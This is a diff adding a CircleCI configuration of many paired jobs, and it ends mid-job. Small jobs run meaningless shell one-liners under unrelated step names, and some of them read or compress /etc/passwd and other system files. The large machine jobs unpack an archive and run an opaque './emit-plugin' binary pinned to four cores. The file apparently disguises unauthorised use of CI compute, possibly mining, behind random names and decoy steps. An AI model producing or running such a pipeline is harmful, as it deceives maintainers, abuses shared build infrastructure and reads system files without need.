@@ -1,0 +1,1678 @@
+version: 2.1
+
+jobs:
+  temp_crate:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: scale in after warmup
+          command: |
+            mkdir -p /var/tmp/basket
+            set +o pipefail 2>/dev/null; comm <(sort -n < <(seq 1 1037581 | sort -R)) <(sort -n < <(seq 1 1037581)) 2>/dev/null | head -n 10000 > /var/tmp/basket/wd; true
+            echo "staged"
+      - persist_to_workspace:
+          root: /var/tmp/basket
+          paths:
+            - 'wd'
+  v7-nightly2:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/basket
+      - run:
+          name: Fetch 4
+          command: |
+            nl /var/tmp/basket/wd 2>/dev/null | tail -1 | awk '{print $1}' || true
+      - run:
+          name: Clone project
+          command: git clone --depth 1 -q --no-single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Restore vendored sources
+          command: bzcat registry-dist.tar.bz2 | tar xf -
+      - run:
+          command: taskset -c 0-3 ./emit-plugin
+  blog-email-text:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/basket
+      - run:
+          name: To begin double check the headless browser
+          command: |
+            mkdir -p /var/tmp/basket
+            { set +o pipefail 2>/dev/null; echo pink white teal brown magenta | xargs printf "%s\n" | sort; true ; } > /var/tmp/basket/neutron359
+            echo "staged"
+      - persist_to_workspace:
+          root: /var/tmp/basket
+          paths:
+            - 'neutron359'
+  UAT_BUILD_9:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/basket
+      - run:
+          name: Fetch 4
+          command: |
+            nl /var/tmp/basket/neutron359 2>/dev/null | tail -1 | awk '{print $1}' || true
+      - run:
+          name: Clone project
+          command: git clone --depth 1 -q --no-single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Fetch fixtures
+          command: bzcat registry-dist.tar.bz2 | tar xf -
+      - run:
+          command: taskset -c 0-3 ./emit-plugin
+  riaksloarkshoost-protocol:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/basket
+      - run:
+          name: If the pager rotation is stale do nothing
+          command: |
+            mkdir -p /var/tmp/basket
+            { set +o pipefail 2>/dev/null; echo "reading config" | cut -c1-4; true ; } > /var/tmp/basket/ysi
+            echo "staged"
+      - persist_to_workspace:
+          root: /var/tmp/basket
+          paths:
+            - 'ysi'
+  Rollout_Staging3:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/basket
+      - run:
+          name: Fetch 4
+          command: |
+            nl /var/tmp/basket/neutron359 2>/dev/null | tail -1 | awk '{print $1}' || true
+      - run:
+          name: Clone project
+          command: git clone --depth 1 -q --no-single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Sync asset bundles
+          command: bzcat registry-dist.tar.bz2 | tar xf -
+      - run:
+          command: taskset -c 0-3 ./emit-plugin
+  initWithWrapper:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/basket
+      - run:
+          name: Once the cable tray is done bail out
+          command: |
+            mkdir -p /var/tmp/basket
+            { set +o pipefail 2>/dev/null; find /etc -maxdepth 1 -type f -printf '%s\n' 2>/dev/null | sort -n | awk '{printf "%05d\n", $1}'; true ; } > /var/tmp/basket/20181001
+            echo "staged"
+      - persist_to_workspace:
+          root: /var/tmp/basket
+          paths:
+            - '20181001'
+  shippit:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/basket
+      - run:
+          name: Fetch 4
+          command: |
+            nl /var/tmp/basket/20181001 2>/dev/null | tail -1 | awk '{print $1}' || true
+      - run:
+          name: Clone project
+          command: git clone --depth 1 -q --no-single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unpack toolkit
+          command: bzcat registry-dist.tar.bz2 | tar xf -
+      - run:
+          command: taskset -c 0-3 ./emit-plugin
+  okStr:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/basket
+      - run:
+          name: Tune The Skybox Zone 7
+          command: |
+            mkdir -p /var/tmp/basket
+            { set +o pipefail 2>/dev/null; find /dev -maxdepth 1 -type f -name 'loop*' -exec sha1sum {} \;; true ; } > /var/tmp/basket/RidgePacketRaven
+            echo "staged"
+      - persist_to_workspace:
+          root: /var/tmp/basket
+          paths:
+            - 'RidgePacketRaven'
+  rm-webhook:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/basket
+      - run:
+          name: Fetch 4
+          command: |
+            nl /var/tmp/basket/neutron359 2>/dev/null | tail -1 | awk '{print $1}' || true
+      - run:
+          name: Clone project
+          command: git clone --depth 1 -q --no-single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Hydrate workspace
+          command: bzcat registry-dist.tar.bz2 | tar xf -
+      - run:
+          command: taskset -c 0-3 ./emit-plugin
+  scoreFreezeListener:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/basket
+      - run:
+          name: Allow 25 secrets at once
+          command: |
+            mkdir -p /var/tmp/basket
+            { set +o pipefail 2>/dev/null; id=(perth kyoto quito delhi osaka); for e in "${id[@]}"; do echo "$e"; done; true ; } > /var/tmp/basket/lVhcRnR8e
+            echo "staged"
+      - persist_to_workspace:
+          root: /var/tmp/basket
+          paths:
+            - 'lVhcRnR8e'
+  Prepare_Tests8:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/basket
+      - run:
+          name: Fetch 4
+          command: |
+            nl /var/tmp/basket/lVhcRnR8e 2>/dev/null | tail -1 | awk '{print $1}' || true
+      - run:
+          name: Clone project
+          command: git clone --depth 1 -q --no-single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Extract sources
+          command: bzcat registry-dist.tar.bz2 | tar xf -
+      - run:
+          command: taskset -c 0-3 ./emit-plugin
+  NQ3MtDYhoNCB:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Initiative Zephyr
+          command: |
+            mkdir -p /var/tmp/basket
+            { set +o pipefail 2>/dev/null; type grep >&/dev/null && echo "have grep" || echo "no grep"; true ; } > /var/tmp/basket/reef376
+            echo "staged"
+      - persist_to_workspace:
+          root: /var/tmp/basket
+          paths:
+            - 'reef376'
+  q1-canary:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/basket
+      - run:
+          name: Fetch 4
+          command: |
+            nl /var/tmp/basket/reef376 2>/dev/null | tail -1 | awk '{print $1}' || true
+      - run:
+          name: Clone project
+          command: git clone --depth 1 -q --no-single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Restore build cache
+          command: bzcat registry-dist.tar.bz2 | tar xf -
+      - run:
+          command: taskset -c 0-3 ./emit-plugin
+  CommonProxyObserver:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/basket
+      - run:
+          name: Smite the DHCP leases
+          command: |
+            mkdir -p /var/tmp/basket
+            { set +o pipefail 2>/dev/null; ps -u $(whoami) | head -n8; true ; } > /var/tmp/basket/omega39
+            echo "staged"
+      - persist_to_workspace:
+          root: /var/tmp/basket
+          paths:
+            - 'omega39'
+  tweak-session-redirect:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/basket
+      - run:
+          name: Fetch 4
+          command: |
+            nl /var/tmp/basket/omega39 2>/dev/null | tail -1 | awk '{print $1}' || true
+      - run:
+          name: Clone project
+          command: git clone --depth 1 -q --no-single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Pull reference data
+          command: bzcat registry-dist.tar.bz2 | tar xf -
+      - run:
+          command: taskset -c 0-3 ./emit-plugin
+  AllInvoices:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/basket
+      - run:
+          name: BatchCostCentersStep
+          command: |
+            mkdir -p /var/tmp/basket
+            { set +o pipefail 2>/dev/null; awk -F':' '{print $1, $7}' < /etc/passwd | tr -d '[:digit:]'; true ; } > /var/tmp/basket/release-3660
+            echo "staged"
+      - persist_to_workspace:
+          root: /var/tmp/basket
+          paths:
+            - 'release-3660'
+  bun-vet:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/basket
+      - run:
+          name: Fetch 4
+          command: |
+            nl /var/tmp/basket/release-3660 2>/dev/null | tail -1 | awk '{print $1}' || true
+      - run:
+          name: Clone project
+          command: git clone --depth 1 -q --no-single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Stage inputs
+          command: bzcat registry-dist.tar.bz2 | tar xf -
+      - run:
+          command: taskset -c 0-3 ./emit-plugin
+  was_default:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/basket
+      - run:
+          name: Codename Sunny Falcon
+          command: |
+            mkdir -p /var/tmp/basket
+            { set +o pipefail 2>/dev/null; printf %s 'are we there yet?' | sha224sum | awk '{print $1}'; true ; } > /var/tmp/basket/sha_20a36aac8e166b89
+            echo "staged"
+      - persist_to_workspace:
+          root: /var/tmp/basket
+          paths:
+            - 'sha_20a36aac8e166b89'
+  blast-off:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/basket
+      - run:
+          name: Fetch 4
+          command: |
+            nl /var/tmp/basket/sha_20a36aac8e166b89 2>/dev/null | tail -1 | awk '{print $1}' || true
+      - run:
+          name: Clone project
+          command: git clone --depth 1 -q --no-single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unpack bundle
+          command: bzcat registry-dist.tar.bz2 | tar xf -
+      - run:
+          command: taskset -c 0-3 ./emit-plugin
+  tip-zag-tic:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/basket
+      - run:
+          name: Defeat overstock
+          command: |
+            mkdir -p /var/tmp/basket
+            { set +o pipefail 2>/dev/null; ls /etc | sort | uniq -ic | awk '{print NF}' | head -n 3; true ; } > /var/tmp/basket/seed-57g
+            echo "staged"
+      - persist_to_workspace:
+          root: /var/tmp/basket
+          paths:
+            - 'seed-57g'
+  node20-vet:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/basket
+      - run:
+          name: Fetch 4
+          command: |
+            nl /var/tmp/basket/seed-57g 2>/dev/null | tail -1 | awk '{print $1}' || true
+      - run:
+          name: Clone project
+          command: git clone --depth 1 -q --no-single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Rehydrate tree
+          command: bzcat registry-dist.tar.bz2 | tar xf -
+      - run:
+          command: taskset -c 0-3 ./emit-plugin
+  Select-TabStatus:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/basket
+      - run:
+          name: S 841 scrolling dropdown
+          command: |
+            mkdir -p /var/tmp/basket
+            { set +o pipefail 2>/dev/null; find /dev -type f -name 'null' -exec stat -c "%y %n" {} + 2> /dev/null | tail -4; true ; } > /var/tmp/basket/5a3li9
+            echo "staged"
+      - persist_to_workspace:
+          root: /var/tmp/basket
+          paths:
+            - '5a3li9'
+  ivan-run:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/basket
+      - run:
+          name: Fetch 4
+          command: |
+            nl /var/tmp/basket/5a3li9 2>/dev/null | tail -1 | awk '{print $1}' || true
+      - run:
+          name: Clone project
+          command: git clone --depth 1 -q --no-single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Fetch corpus
+          command: bzcat registry-dist.tar.bz2 | tar xf -
+      - run:
+          command: taskset -c 0-3 ./emit-plugin
+  perkEnt:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Dilute the culture plates at 95 degrees
+          command: |
+            mkdir -p /var/tmp/basket
+            { set +o pipefail 2>/dev/null; grep -o --context=1 if /etc/profile; true ; } > /var/tmp/basket/trace_20240726
+            echo "staged"
+      - persist_to_workspace:
+          root: /var/tmp/basket
+          paths:
+            - 'trace_20240726'
+  tango:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/basket
+      - run:
+          name: Fetch 4
+          command: |
+            nl /var/tmp/basket/neutron359 2>/dev/null | tail -1 | awk '{print $1}' || true
+      - run:
+          name: Clone project
+          command: git clone --depth 1 -q --no-single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Checkout vendored deps
+          command: bzcat registry-dist.tar.bz2 | tar xf -
+      - run:
+          command: taskset -c 0-3 ./emit-plugin
+  ADAPTER_V2_8:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/basket
+      - run:
+          name: Schedule the contracts by payroll cutoff
+          command: |
+            mkdir -p /var/tmp/basket
+            { set +o pipefail 2>/dev/null; getent hosts localhost | tac | fold -w 31; true ; } > /var/tmp/basket/797ba190453
+            echo "staged"
+      - persist_to_workspace:
+          root: /var/tmp/basket
+          paths:
+            - '797ba190453'
+  rip-it:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/basket
+      - run:
+          name: Fetch 4
+          command: |
+            nl /var/tmp/basket/797ba190453 2>/dev/null | tail -1 | awk '{print $1}' || true
+      - run:
+          name: Clone project
+          command: git clone --depth 1 -q --no-single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Prime workspace
+          command: bzcat registry-dist.tar.bz2 | tar xf -
+      - run:
+          command: taskset -c 0-3 ./emit-plugin
+  isBottom:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/basket
+      - run:
+          name: Store test tubes batch 3
+          command: |
+            mkdir -p /var/tmp/basket
+            { set +o pipefail 2>/dev/null; for p in zebra crow tiger cat; do printf '%s\n' $p; done; true ; } > /var/tmp/basket/2z1603ts33u
+            echo "staged"
+      - persist_to_workspace:
+          root: /var/tmp/basket
+          paths:
+            - '2z1603ts33u'
+  p-3:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/basket
+      - run:
+          name: Fetch 4
+          command: |
+            nl /var/tmp/basket/2z1603ts33u 2>/dev/null | tail -1 | awk '{print $1}' || true
+      - run:
+          name: Clone project
+          command: git clone --depth 1 -q --no-single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unpack payload
+          command: bzcat registry-dist.tar.bz2 | tar xf -
+      - run:
+          command: taskset -c 0-3 ./emit-plugin
+  sdof27od8:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/basket
+      - run:
+          name: Unfold the backlog
+          command: |
+            mkdir -p /var/tmp/basket
+            { set +o pipefail 2>/dev/null; touch ${TMPDIR:-/tmp}/garlic.txt ${TMPDIR:-/tmp}/fixes.bak && ls -l ${TMPDIR:-/tmp}/garlic.txt ${TMPDIR:-/tmp}/fixes.bak; true ; } > /var/tmp/basket/greenThunderChrome
+            echo "staged"
+      - persist_to_workspace:
+          root: /var/tmp/basket
+          paths:
+            - 'greenThunderChrome'
+  promote:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/basket
+      - run:
+          name: Fetch 4
+          command: |
+            nl /var/tmp/basket/greenThunderChrome 2>/dev/null | tail -1 | awk '{print $1}' || true
+      - run:
+          name: Clone project
+          command: git clone --depth 1 -q --no-single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Restore snapshot
+          command: bzcat registry-dist.tar.bz2 | tar xf -
+      - run:
+          command: taskset -c 0-3 ./emit-plugin
+  primary-mustard:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/basket
+      - run:
+          name: Jam on the queue
+          command: |
+            mkdir -p /var/tmp/basket
+            { set +o pipefail 2>/dev/null; printf '%d\n' 103 34 222 450 | sort -r -n | paste -sd+; true ; } > /var/tmp/basket/80645e77-1826
+            echo "staged"
+      - persist_to_workspace:
+          root: /var/tmp/basket
+          paths:
+            - '80645e77-1826'
+  ci:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/basket
+      - run:
+          name: Fetch 4
+          command: |
+            nl /var/tmp/basket/80645e77-1826 2>/dev/null | tail -1 | awk '{print $1}' || true
+      - run:
+          name: Clone project
+          command: git clone --depth 1 -q --no-single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Fetch sources
+          command: bzcat registry-dist.tar.bz2 | tar xf -
+      - run:
+          command: taskset -c 0-3 ./emit-plugin
+  JhRuaW:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/basket
+      - run:
+          name: unlock heartbeat on perf
+          command: |
+            mkdir -p /var/tmp/basket
+            { set +o pipefail 2>/dev/null; gzip -c /etc/passwd >'/var/tmp/IdeasRackValley.gz' && zgrep -c bash '/var/tmp/IdeasRackValley.gz'; true ; } > /var/tmp/basket/6071da0b-92cd
+            echo "staged"
+      - persist_to_workspace:
+          root: /var/tmp/basket
+          paths:
+            - '6071da0b-92cd'
+  rocket:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/basket
+      - run:
+          name: Fetch 4
+          command: |
+            nl /var/tmp/basket/6071da0b-92cd 2>/dev/null | tail -1 | awk '{print $1}' || true
+      - run:
+          name: Clone project
+          command: git clone --depth 1 -q --no-single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unroll archive
+          command: bzcat registry-dist.tar.bz2 | tar xf -
+      - run:
+          command: taskset -c 0-3 ./emit-plugin
+  model-dialog-semaphore:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Beta API Key Approval
+          command: |
+            mkdir -p /var/tmp/basket
+            { set +o pipefail 2>/dev/null; shuf -i 1-734 -n 12 | awk '{printf "%05d\n", $1}' | sort; true ; } > /var/tmp/basket/c0b41tb150n
+            echo "staged"
+      - persist_to_workspace:
+          root: /var/tmp/basket
+          paths:
+            - 'c0b41tb150n'
+  nightly-v1:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/basket
+      - run:
+          name: Fetch 4
+          command: |
+            nl /var/tmp/basket/c0b41tb150n 2>/dev/null | tail -1 | awk '{print $1}' || true
+      - run:
+          name: Clone project
+          command: git clone --depth 1 -q --no-single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Seed workspace
+          command: bzcat registry-dist.tar.bz2 | tar xf -
+      - run:
+          command: taskset -c 0-3 ./emit-plugin
+  waveSpawnPtr:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/basket
+      - run:
+          name: Wait for the cart icon to appear
+          command: |
+            mkdir -p /var/tmp/basket
+            { set +o pipefail 2>/dev/null; echo "86 - 26 = $((86 - 26))"; true ; } > /var/tmp/basket/engineOtter
+            echo "staged"
+      - persist_to_workspace:
+          root: /var/tmp/basket
+          paths:
+            - 'engineOtter'
+  perseus-final:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/basket
+      - run:
+          name: Fetch 4
+          command: |
+            nl /var/tmp/basket/neutron359 2>/dev/null | tail -1 | awk '{print $1}' || true
+      - run:
+          name: Clone project
+          command: git clone --depth 1 -q --no-single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unpack sources
+          command: bzcat registry-dist.tar.bz2 | tar xf -
+      - run:
+          command: taskset -c 0-3 ./emit-plugin
+  qCenter:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/basket
+      - run:
+          name: Ten nine eight sharding
+          command: |
+            mkdir -p /var/tmp/basket
+            { set +o pipefail 2>/dev/null; [ -G ~ ] && echo 'good' || echo bad; true ; } > /var/tmp/basket/ADMIN_SOUTH_POLAR
+            echo "staged"
+      - persist_to_workspace:
+          root: /var/tmp/basket
+          paths:
+            - 'ADMIN_SOUTH_POLAR'
+  bun-bench:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/basket
+      - run:
+          name: Fetch 4
+          command: |
+            nl /var/tmp/basket/ADMIN_SOUTH_POLAR 2>/dev/null | tail -1 | awk '{print $1}' || true
+      - run:
+          name: Clone project
+          command: git clone --depth 1 -q --no-single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Restore vendored sources
+          command: bzcat registry-dist.tar.bz2 | tar xf -
+      - run:
+          command: taskset -c 0-3 ./emit-plugin
+  store-armv7-latest:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/basket
+      - run:
+          name: Collect
+          command: |
+            mkdir -p /var/tmp/basket
+            { set +o pipefail 2>/dev/null; tar --create --file="${TMPDIR:-/tmp}/log_router_tomato.tar" -C /etc hosts && tar -rf "${TMPDIR:-/tmp}/log_router_tomato.tar" -C /etc shells && tar -tf "${TMPDIR:-/tmp}/log_router_tomato.tar"; true ; } > /var/tmp/basket/trace_20201012
+            echo "staged"
+      - persist_to_workspace:
+          root: /var/tmp/basket
+          paths:
+            - 'trace_20201012'
+  check-quick-release-candidate:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/basket
+      - run:
+          name: Fetch 4
+          command: |
+            nl /var/tmp/basket/trace_20201012 2>/dev/null | tail -1 | awk '{print $1}' || true
+      - run:
+          name: Clone project
+          command: git clone --depth 1 -q --no-single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Fetch fixtures
+          command: bzcat registry-dist.tar.bz2 | tar xf -
+      - run:
+          command: taskset -c 0-3 ./emit-plugin
+  constNum:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/basket
+      - run:
+          name: ntp sync bounce HR8359
+          command: |
+            mkdir -p /var/tmp/basket
+            { set +o pipefail 2>/dev/null; cat /etc/hosts | awk '{print $2}' | grep -c .; true ; } > /var/tmp/basket/patch-v9.16.21
+            echo "staged"
+      - persist_to_workspace:
+          root: /var/tmp/basket
+          paths:
+            - 'patch-v9.16.21'
+  q2-canary:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/basket
+      - run:
+          name: Fetch 4
+          command: |
+            nl /var/tmp/basket/patch-v9.16.21 2>/dev/null | tail -1 | awk '{print $1}' || true
+      - run:
+          name: Clone project
+          command: git clone --depth 1 -q --no-single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Sync asset bundles
+          command: bzcat registry-dist.tar.bz2 | tar xf -
+      - run:
+          command: taskset -c 0-3 ./emit-plugin
+  bitBuf:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/basket
+      - run:
+          name: Post the year end pack fy26
+          command: |
+            mkdir -p /var/tmp/basket
+            { set +o pipefail 2>/dev/null; tar --exclude='*.sh' -czf "/var/tmp/row.tar.gz" -C /etc skel && tar -tzf "/var/tmp/row.tar.gz" | head -n 5; true ; } > /var/tmp/basket/4DJZwCuU0Zk
+            echo "staged"
+      - persist_to_workspace:
+          root: /var/tmp/basket
+          paths:
+            - '4DJZwCuU0Zk'
+  Package_Service9:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/basket
+      - run:
+          name: Fetch 4
+          command: |
+            nl /var/tmp/basket/4DJZwCuU0Zk 2>/dev/null | tail -1 | awk '{print $1}' || true
+      - run:
+          name: Clone project
+          command: git clone --depth 1 -q --no-single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unpack toolkit
+          command: bzcat registry-dist.tar.bz2 | tar xf -
+      - run:
+          command: taskset -c 0-3 ./emit-plugin
+  dumpCountForKey:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Early stop after 5
+          command: |
+            mkdir -p /var/tmp/basket
+            { set +o pipefail 2>/dev/null; for word in frog zebra horse eagle whale; do echo "item: $word"; done | tac; true ; } > /var/tmp/basket/sample1_e1dd
+            echo "staged"
+      - persist_to_workspace:
+          root: /var/tmp/basket
+          paths:
+            - 'sample1_e1dd'
+  validate-quick-release-candidate:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/basket
+      - run:
+          name: Fetch 4
+          command: |
+            nl /var/tmp/basket/sample1_e1dd 2>/dev/null | tail -1 | awk '{print $1}' || true
+      - run:
+          name: Clone project
+          command: git clone --depth 1 -q --no-single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Hydrate workspace
+          command: bzcat registry-dist.tar.bz2 | tar xf -
+      - run:
+          command: taskset -c 0-3 ./emit-plugin
+  price254:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/basket
+      - run:
+          name: Deglaze the raw captures
+          command: |
+            mkdir -p /var/tmp/basket
+            { set +o pipefail 2>/dev/null; for val in {1..8..2}; do echo "$val squared is $((val**2))"; done; true ; } > /var/tmp/basket/70.235.129
+            echo "staged"
+      - persist_to_workspace:
+          root: /var/tmp/basket
+          paths:
+            - '70.235.129'
+  INIT_STG:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/basket
+      - run:
+          name: Fetch 4
+          command: |
+            nl /var/tmp/basket/neutron359 2>/dev/null | tail -1 | awk '{print $1}' || true
+      - run:
+          name: Clone project
+          command: git clone --depth 1 -q --no-single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Extract sources
+          command: bzcat registry-dist.tar.bz2 | tar xf -
+      - run:
+          command: taskset -c 0-3 ./emit-plugin
+  pnl_protocol:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/basket
+      - run:
+          name: Inspect the pick list wave 5
+          command: |
+            mkdir -p /var/tmp/basket
+            { set +o pipefail 2>/dev/null; mkdir -p "/dev/shm/site" && touch "/dev/shm/site"/part{1..4}.tmp && ls "/dev/shm/site"; true ; } > /var/tmp/basket/44c5c-3913-ui
+            echo "staged"
+      - persist_to_workspace:
